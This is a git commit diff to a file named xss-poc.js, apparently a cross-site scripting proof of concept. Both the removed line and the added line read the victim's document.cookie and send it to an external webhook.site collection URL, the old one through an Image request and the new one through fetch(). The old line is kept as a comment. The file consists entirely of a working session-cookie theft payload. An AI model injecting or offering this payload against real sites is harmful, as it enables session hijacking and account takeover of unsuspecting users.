629cafe5b6c974e05e741b126da39d7a7c495523
Krashby1 <82218480+Krashby1@users.noreply.github.com>
2023-06-21 18:43:36 -0400

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,1 +1,3 @@
-var i=new Image();i.src="https://webhook.site/0bc2b281-846c-4f54-b94b-f1875e4ed661/?cookie="+document.cookie;
+fetch("https://webhook.site/0bc2b281-846c-4f54-b94b-f1875e4ed661/?cookie=" + document.cookie);
+
+// var i=new Image();i.src="https://webhook.site/0bc2b281-846c-4f54-b94b-f1875e4ed661/?cookie="+document.cookie;
